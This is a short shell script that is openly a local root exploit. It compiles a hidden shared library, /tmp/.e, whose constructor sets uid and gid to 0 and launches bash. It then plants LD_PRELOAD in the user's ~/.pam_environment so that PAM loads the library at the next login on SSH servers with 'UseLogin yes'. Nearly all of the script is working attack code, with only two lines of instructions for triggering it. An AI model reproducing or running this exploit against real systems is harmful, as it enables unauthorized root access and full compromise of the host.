#!/bin/sh
 

cd ~/
cat > /tmp/.e.c << EOF
void __attribute__((constructor)) init()
{
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF
gcc -w -fPIC -shared -o /tmp/.e /tmp/.e.c
echo "LD_PRELOAD=/tmp/.e" > .pam_environment

echo "Now log back into your shell (or re-ssh) to make PAM call vulnerable code"
echo "Only useful when "UseLogin yes" in /etc/ssh/sshd_config"
